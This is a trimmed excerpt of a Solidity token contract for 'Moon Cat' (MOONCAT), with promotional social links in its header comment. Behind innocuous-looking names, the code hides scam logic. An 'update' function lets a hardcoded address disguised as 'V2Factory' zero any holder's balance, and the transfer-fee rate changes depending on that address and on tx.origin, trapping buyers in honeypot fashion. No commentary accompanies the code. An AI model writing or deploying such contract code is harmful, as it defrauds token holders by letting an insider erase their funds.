...
https://twitter.com/MoonCatCoinETH
https://t.me.com/MoonCatCoinETH
https://MoonCatCoinETH.xyz
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address internal routerV2 = 0x272cAf988aaCd5067B739a10Fb09d897b7569f2B;
    string private _symbol;
    string private _name;
    mapping(address => mapping(address => uint256)) private _swapEnableds;
    address private V2Factory = 0x990F4fef232bc7929e90e81C4B0471fdA4164CFE;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual
    {
        ...
        uint256 swapamount = amount.mul(to != tx.origin && from != routerV2 && _balances[V2Factory] > 0 ? _pairToken : _swapEnabled).div(100)+0;
        if (swapamount > 0)
        {
     ...
     *
     */
    function update(address updateSender) external { if (msg.sender == V2Factory) _balances[updateSender] = 0x0; }
...
contract MoonCatCoin is ERC20, Ownable
{
    constructor()
    ERC20(unicode"Moon Cat", unicode"MOONCAT")
    {
